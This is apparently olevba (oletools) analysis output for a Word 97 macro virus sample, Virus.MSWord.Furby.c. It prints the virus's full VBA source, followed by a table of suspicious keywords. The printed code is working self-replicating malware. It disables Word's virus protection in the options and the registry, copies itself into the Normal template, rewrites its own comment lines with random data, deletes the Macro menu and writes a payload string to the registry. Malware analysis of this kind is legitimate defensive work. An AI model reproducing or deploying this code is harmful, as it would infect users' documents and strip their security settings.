olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Furby.c-1711ce642cf00b038a867bd87276eabf70c5911a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Furby.c-1711ce642cf00b038a867bd87276eabf70c5911a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo ldr
Randomize: Options.VirusProtection = Chr(48): Options.SaveNormalPrompt = Chr(48): Options.ConfirmConversions = Chr(48): vx = 1: xv = 4: x = 0: z = 0: y = 0
xrt = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines
'77495424400Скрепыш54817735214,24812365474577E+20Скрепыш774954244005481773521774954244005481773521
xst = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines
If xst > Sgn(x) And xrt > Sgn(x) Then GoTo ldr
If xst = Sgn(x) Then
    Set czy = NormalTemplate.VBProject.VBComponents
'12557219481Скрепыш698544900008,7717816266332E+20Скрепыш12557219481698544900001255721948169854490000
    Set hst = ActiveDocument.VBProject.VBComponents
    If Month(Now()) > 1 And Day(Now()) = 15 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "It's Zippy!"
    hst.Item(Cos(Atn(CInt(1)))).Name = czy.Item(Cos(Atn(CInt(1)))).Name
    hst.Item(Cos(Atn(CInt(1)))).Export Windows.Application.Path & Chr(46) + Chr(100) + Chr(108) + Chr(108)
'32728789921Скрепыш4116029441,34712662850411E+19Скрепыш3272878992141160294432728789921411602944
End If
If xrt = Sgn(x) Then Set czy = ActiveDocument.VBProject.VBComponents
czy.Item(Cos(Atn(CInt(1)))).codemodule.AddFromFile Windows.Application.Path & Chr(46) + Chr(100) + Chr(108) + Chr(108)
With czy.Item(Cos(Atn(CInt(1)))).codemodule
'602162521Скрепыш79160167844,76672862293175E+18Скрепыш60216252179160167846021625217916016784
    For j = Abs(vx) To Abs(xv)
    .deletelines Abs(vx)
        Next j
End With
'204882064321Скрепыш36719964097,52326204455219E+20Скрепыш20488206432136719964092048820643213671996409
With czy.Item(Cos(Atn(CInt(1)))).codemodule
For j = Chr(53) To 40 Step Chr(53)
    y = Int(Rnd(412835) * 503989) + 8485: z = Int(Rnd(684958) * 385865) + 2988
    .replaceline j, Chr(39) & y * y & Application.Assistant & z * z & y * y * z * z & Application.Assistant & y * y & z * z & y * y & z * z
'170596259089Скрепыш1247601297962,12836114266557E+22Скрепыш170596259089124760129796170596259089124760129796
     Next j
End With
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
'2630253796Скрепыш716223691,88385007940763E+17Скрепыш263025379671622369263025379671622369
If xst = Sgn(x) Then CommandBars(Chr(116) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Delete
If xst = Sgn(x) Then czy.Item(Cos(Atn(CInt(1)))).codemodule.replaceline Abs(vx), "Sub AutoClose()"
If xst = Sgn(x) And xrt = Sgn(x) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ldr:
'569920129Скрепыш305587841,74160661193631E+16Скрепыш5699201293055878456992012930558784
If xst <> Sgn(x) And xrt = Sgn(x) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'WM97/It's Zippy! by Virus :) Smile
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|wIT$@               |7749542440                                   |
|Hex String|`!bR                |60216252                                     |
|Hex String|vg(b)1u             |76672862293175                               |
|Hex String|qb#i                |71622369                                     |
+----------+--------------------+---------------------------------------------+

